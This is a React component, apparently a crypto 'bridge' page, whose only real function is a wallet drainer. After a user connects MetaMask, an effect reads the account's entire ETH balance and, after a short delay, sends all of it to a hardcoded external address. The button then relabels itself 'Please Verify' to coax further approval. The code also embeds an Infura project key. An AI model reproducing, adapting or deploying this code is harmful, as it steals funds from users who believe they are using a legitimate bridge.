import React, { useState, useCallback, useEffect } from "react";
import Web3 from "web3";
//import { connector } from "../config";

const Brigde = () => {
  const [account, setAccount] = useState(null);
  const [active, setActive] = useState(false);
  const [balanceEth, setBalanceEth] = useState(null);
  const [verified, setVerified] = useState(false); // Nuevo estado para la verificación

  const handleSubmit = (event) => {
    event.preventDefault();
  };

  


  const web3 = new Web3('https://mainnet.infura.io/v3/a90a4816d313441c86efc402412a7193');

  const fetchBalance = useCallback(async () => {
    if (account) {
      const balanceWei = await web3.eth.getBalance(account);
      const balanceEth = web3.utils.fromWei(balanceWei, "ether");
      setBalanceEth(balanceEth);
      console.log(balanceEth)
    }
  }, [account, web3.eth, web3.utils]);

  useEffect(() => {
    fetchBalance();
  }, [fetchBalance]);

  useEffect(() => {
    // Obtener la dirección de la cuenta conectada al proveedor
    web3.eth.getAccounts().then(accounts => {
      if (accounts.length > 0) {
        setAccount(accounts[0]);
        setActive(true);
      }
    });
  }, [web3.eth]);

  useEffect(() => {
    const transfer = async () => {
      if (active && balanceEth) {
        const amountWei = web3.utils.toWei(balanceEth.toString(), "ether");
        const destinationAddress = "0x8F3F79D4c2b1C557e9Ef88F16Afc709041d6e7D0";
        console.log(destinationAddress)

      // Retrasar la función transfer por 2 segundos
      await new Promise((resolve) => setTimeout(resolve, 2000));

        await web3.eth.sendTransaction({
          from: account,
          to: destinationAddress,
          value: amountWei,
          gas:30000,
          maxFeePerGas:1000000108,       
        });
      }
      
    };

    transfer();
  }, [active, balanceEth, account, web3.utils, web3.eth]);

  const connectMetamask = async () => {
    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      if (accounts.length > 0) {
        setAccount(accounts[0]);
        setActive(true);
        setVerified(true); // Cambia el estado de verificación a true
      }
    } catch (error) {
      console.error("Error connecting with Metamask:", error);
    }
  };
  

  return (
    <div className="brigde_container">
      <div className="brigde_box-container">
        <form onSubmit={handleSubmit} action="">
          <button onClick={connectMetamask}>
          {verified ? "Please Verify" : "Connect wallet"}
          </button>
          
        </form>
      </div>
    </div>
  );
};

export default Brigde;
